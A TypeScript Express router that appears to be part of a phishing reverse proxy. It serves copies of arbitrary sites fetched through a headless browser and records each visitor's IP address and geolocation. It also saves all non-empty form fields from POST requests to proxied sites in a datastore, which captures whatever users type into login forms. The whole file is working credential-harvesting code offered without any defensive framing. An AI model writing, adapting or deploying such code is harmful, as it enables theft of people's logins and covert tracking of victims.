import { Router } from 'express'
import * as Path from 'path'

import ipLookup from '../ipLookup'
import { Guest, Setting } from '../datastore'
import { httpify, isValidUrl } from '../utils'
import { BASE_DIR } from '../constants'


const router = Router()
const cacheDir = Path.join(BASE_DIR, 'cache')

router.all('*', async (req, resp) => {
    let link = httpify(decodeURIComponent(req.url.slice(1)))
    const setting:Setting = await Setting.findOne({})
    const ip = req.header('x-forwarded-for') || req.connection.remoteAddress
    const { browser } = resp.locals
    let guest:Guest = await Guest.findOne({ ip })

    if (!guest) guest = await new Guest().add(ip)
    if (!isValidUrl(link)) link = setting.defaultLink
    else guest.logs.push(`${req.method} - ${link} - ${new Date()}`)

    const ipInfo = await ipLookup(ip) || {}

    Object.entries(ipInfo)
          .forEach(([key, value]) => guest[key] = value)

    if (req.method.toLowerCase() === 'post' && !link.startsWith(setting.defaultLink)) {
        /* Storing in arrays intentionally, nedb-models fails with nested objects 🤷‍♂️ */
        const chunks = Object
            .entries(req.body)
            .filter(([key, value]) => !!value)
            .map(([key, value]) => `${key}: ${value}`)

        if (chunks.length) guest.posts.push({path: link, date: new Date(), data: chunks})
    }

    await guest.save()
    resp.status(200)
        .sendFile(Path.join(cacheDir, await browser.get(link, req.headers, ip)))
})


export default router
